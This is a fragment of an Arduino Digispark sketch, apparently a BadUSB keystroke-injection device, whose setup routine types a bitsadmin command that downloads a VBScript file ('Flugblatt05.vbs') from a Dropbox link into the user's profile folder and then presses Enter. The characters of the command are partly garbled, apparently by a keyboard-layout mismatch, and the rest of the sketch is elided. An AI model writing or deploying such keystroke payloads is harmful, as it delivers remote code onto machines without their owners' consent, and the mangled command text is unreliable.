...
void setup() {
  ...
  DigiKeyboard.print("bitsadmin &transfer wcb &prioritz high https>&&www.dropbox.com&s&g5ppuyglbjrgouc&Flugblatt05.vbs_dl)1 %USERPROFILE%&Flugblatt05.vbs");//Downloadet das Flugblatt-Programm 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
